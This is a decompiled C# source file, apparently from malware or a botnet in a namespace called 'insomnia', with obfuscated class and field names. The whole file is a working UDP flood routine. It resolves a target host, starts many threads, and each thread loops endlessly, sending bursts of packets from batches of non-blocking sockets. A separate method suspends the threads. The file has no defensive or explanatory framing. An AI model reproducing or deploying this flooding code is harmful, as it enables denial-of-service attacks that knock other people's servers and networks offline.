using System.Net;
using System.Net.Sockets;
using System.Threading;

namespace insomnia;

internal class Class40
{
	private class Class41
	{
		private IPEndPoint Field4;

		private int Field3;

		private Socket[] Field2;

		private int Field1;

		public Class41(IPEndPoint ipEo, int SynSockets, int pSize)
		{
			Field4 = ipEo;
			Field1 = SynSockets;
			Field3 = pSize;
		}

		public void Method1()
		{
			while (true)
			{
				byte[] buffer = new byte[Field3];
				try
				{
					Field2 = new Socket[Field1];
					for (int i = 0; i < Field1; i++)
					{
						Field2[i] = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
						Field2[i].Blocking = false;
						Field2[i].SendTo(buffer, Field4);
					}
					Thread.Sleep(100);
					for (int i = 0; i < Field1; i++)
					{
						if (Field2[i].Connected)
						{
							Field2[i].Disconnect(reuseSocket: false);
						}
						Field2[i].Close();
						Field2[i] = null;
					}
					Field2 = null;
				}
				catch
				{
					for (int i = 0; i < Field1; i++)
					{
						try
						{
							if (Field2[i].Connected)
							{
								Field2[i].Disconnect(reuseSocket: false);
							}
							Field2[i].Close();
							Field2[i] = null;
						}
						catch
						{
						}
					}
				}
			}
		}
	}

	private static ThreadStart[] Field10;

	private static Thread[] Field9;

	public static string Field8;

	private static IPEndPoint Field7;

	public static int Field6;

	public static int Field5;

	private static Class41[] Field4;

	public static int Field3;

	public static int Field2;

	public static bool Field1 = false;

	public static void Method2()
	{
		try
		{
			Field7 = new IPEndPoint(Dns.GetHostEntry(Field8).AddressList[0], Field6);
		}
		catch
		{
			Field7 = new IPEndPoint(IPAddress.Parse(Field8), Field6);
		}
		Field9 = new Thread[Field3];
		Field10 = new ThreadStart[Field3];
		Field4 = new Class41[Field3];
		for (int i = 0; i < Field3; i++)
		{
			Field4[i] = new Class41(Field7, Field2, Field5);
			Field10[i] = Field4[i].Method1;
			Field9[i] = new Thread(Field10[i]);
			Field9[i].Start();
		}
	}

	public static void Method1()
	{
		for (int i = 0; i < Field3; i++)
		{
			try
			{
				Field9[i].Suspend();
			}
			catch
			{
			}
		}
	}
}
